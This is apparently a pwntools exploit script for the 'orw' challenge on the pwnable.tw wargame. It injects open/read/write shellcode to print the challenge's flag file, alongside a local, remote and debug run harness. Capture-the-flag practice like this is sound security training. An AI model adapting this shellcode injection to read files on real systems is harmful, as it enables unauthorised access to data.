#!/usr/bin/python3
from pwn import *

# ===========================================================
#                    SETUP FUNCTIONS
# ===========================================================

class Payload:
    def __init__(self): 
        self.str = b""

    def __iadd__(self, string):
        self.str += string
        return self

    def reset(self):
        self.str = b""

    def get(self):
        return self.str

def print_message():
    cDFL = "\033[0m"
    cBLK = "\033[1;30m"
    cRED = "\033[1;31m"
    cGRN = "\033[1;32m"
    cYLW = "\033[1;33m"
    cBLU = "\033[1;34m"

    text = """
┌───────────────────────────────┐
│        RUNNING EXPLOIT        │
│                               │"""

    if (args.DEBUG):
        text += f"""
│  DEBUGGING   {cGRN}ENABLED{cDFL}          │"""
    else:
        text += f"""
│  DEBUGGING   {cRED}DISABLED{cDFL}         │"""

    if (args.NOITR):
        text += f"""
│  INTERACTIVE {cRED}DISABLED{cDFL}         │"""
    else:
        text += f"""
│  INTERACTIVE {cGRN}ENABLED{cDFL}          │"""

    if (args.GDB):
        text += f"""
│  RUNNING     {cYLW}GDB{cDFL}              │
└───────────────────────────────┘
"""
    elif (args.REMOTE):
        text += f"""
│  RUNNING     {cBLU}REMOTE EXPLOIT{cDFL}   │
└───────────────────────────────┘
"""
    else:
        text += f"""
│  RUNNING     {cBLK}LOCAL EXPLOIT{cDFL}    │
└───────────────────────────────┘
"""

    print(text)

def initIO():
    print_message()
    if (args.DEBUG):
        context.log_level = "debug"

    if (args.GDB):
        return gdb.debug(ELF.path, gdbscript=SCRIPT)
    if (args.REMOTE):
        return remote(SERVER, PORT)
    return ELF.process()

# ===========================================================
#                       CONFIG SETUP
# ===========================================================

# LOCAL
FILE = "./orw"
LIBC = ""
ELF = context.binary = ELF(FILE, checksec=False)

# REMOTE
SERVER = "chall.pwnable.tw"
PORT = 10001

# GDB
context.terminal = "kitty"
SCRIPT = """

"""

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = initIO()

offset = 0

payload = Payload()

payload += asm(shellcraft.open("/home/orw/flag"))
payload += asm(shellcraft.read("eax", "esp", 0x100))
payload += asm(shellcraft.write(1, "esp", 0x100))
payload += asm(shellcraft.exit(0))

io.sendline(payload.get())

io.recvuntil(b"shellcode:")

print(io.recvline(False))

if (not args.NOITR):
    io.interactive()
